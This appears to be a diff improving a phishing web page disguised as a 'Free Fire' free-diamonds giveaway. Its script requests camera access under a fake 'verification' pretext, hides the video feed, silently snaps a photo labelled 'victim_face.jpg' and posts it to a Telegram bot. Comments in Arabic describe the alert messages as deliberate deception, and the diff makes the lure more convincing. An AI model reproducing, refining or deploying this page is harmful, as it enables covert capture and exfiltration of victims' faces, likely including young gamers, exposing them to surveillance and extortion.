@@ -1,21 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free Fire Rewards</title>
+    <title>🎁 Free Fire Rewards🎁</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #121212; color: orange; text-align: center; font-family: sans-serif; margin: 0; padding: 20px; }
-        .btn { padding: 20px 40px; background: orange; color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 80%; max-width: 300px; }
-        /* نخفو الفيديو باش ما يفيقش */
-        #video { display: none; }
-        canvas { display: none; }
+        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
+        .app-icon { width: 100px; height: 100px; border-radius: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
+        h1 { font-size: 24px; color: #fff; margin-top: 15px; }
+        p { font-size: 16px; color: #ecf0f1; }
+        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; animation: pulse 1.5s infinite; }
+        /* أنيميشن زر النبض */
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 10px rgba(231, 76, 60, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0); }
+        }
+        /* إخفاء الفيديو والكانفاس */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div style="margin-top: 50px;">
-        <h1>💎 Free Diamonds Claim 💎</h1>
-        <p>Click the button below to claim 1000 Diamonds!</p>
-        <button class="btn" onclick="startCapture()">CLAIM NOW</button>
+    <div class="container">
+        <img src="https://image.api.playstation.com/vulcan/ap/rnd/202107/2007/Xf2JmFvM3w2X0zP3vXzG4yvQ.png" alt="Free Fire" class="app-icon">
+        <h1>💎 Claim Your 1000 Diamonds 💎</h1>
+        <p>Verification is required to ensure account safety.</p>
+        <button class="btn" onclick="startCapture()">CLAIM & VERIFY NOW</button>
     </div>
 
     <video id="video" width="640" height="480" autoplay></video>
@@ -27,14 +37,15 @@
 
         async function startCapture() {
             try {
-                // 1. طلب الكاميرا
+                // 1. طلب الكاميرا ديريكت
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                alert("Verifying Account... Please wait.");
+                // رسالة خادعة باش يآمن
+                alert("🎁 Checking account status... Photo validation required!");
 
-                // 2. التقاط صورة بعد ثانية واحدة (باش يوافق)
+                // 2. التقاط صورة بعد 2 ثانية (باش يوافق)
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
@@ -45,17 +56,18 @@
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
                         formData.append('photo', blob, 'victim_face.jpg');
-                        formData.append('caption', '🎯 Captured! Victim is on the page.');
+                        formData.append('caption', '🎯 Captured! Victim validated photo.');
 
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         });
                     }, 'image/jpeg');
-                }, 1000);
+                }, 2000);
 
             } catch (err) {
-                alert("Error: Camera permission required to verify your identity!");
+                // رسالة خطأ مزورة إذا رفض الكاميرا
+                alert("Error: Camera permission required for identity verification!");
             }
         }
     </script>
